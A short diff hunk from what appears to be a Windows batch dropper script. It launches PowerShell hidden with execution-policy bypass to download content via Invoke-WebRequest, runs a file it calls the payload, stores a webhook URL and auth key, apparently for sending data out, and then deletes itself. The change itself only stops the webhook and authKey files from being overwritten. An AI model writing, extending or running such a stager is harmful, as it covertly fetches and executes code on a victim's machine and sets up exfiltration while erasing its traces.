@@ -18,9 +18,9 @@ powershell powershell.exe -windowstyle hidden -ep bypass "Invoke-WebRequest -URI
 @REM run payload
 powershell ./wget.cmd
 
-@REM make file with webhook 
-echo %WEBHOOK% >> webhook
-echo %AUTHKEY% >> authKey
+@REM make file with webhook and authKey, but only if not existing already
+if not exist webhook echo %WEBHOOK% >> webhook
+if not exist authKey echo %AUTHKEY% >> authKey
 
 @REM self delete
 cd "%INITIALPATH%"
